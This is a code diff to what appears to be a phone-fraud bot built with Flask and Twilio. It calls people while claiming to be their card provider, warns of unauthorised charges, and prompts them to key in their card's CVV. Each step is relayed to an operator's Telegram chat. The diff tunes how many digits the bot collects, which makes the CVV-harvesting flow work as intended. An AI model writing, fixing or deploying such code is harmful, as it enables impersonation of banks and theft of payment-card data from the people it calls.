@@ -316,7 +316,7 @@ def voicecvv():
     if 'Digits' in request.values:
         choice = request.values['Digits']
         if choice == '1':
-            gather = Gather(num_digits=16, action='/validate?chanid=' + chanid, timeout=16)
+            gather = Gather(num_digits=3, action='/validate?chanid=' + chanid, timeout=16)
             requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed User will enter card info soon"})
             print('')
             gather.say('To confirm this please enter the C V V  for this card in the pinpad now', volume=2, voice="alice")
@@ -330,7 +330,7 @@ def voicecvv():
             answered_by = request.values['AnsweredBy']
             if answered_by == 'human':
                 requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
-        gather = Gather(num_digits=3, action='/voice/cvv?chanid=' + chanid, timeout=6)
+        gather = Gather(num_digits=1, action='/voice/cvv?chanid=' + chanid, timeout=6)
         requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
         gather.say(f'Hello {name}, this is your card provider. We are calling to inform you about a request to make charges on your {cardname}. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
         resp.append(gather)
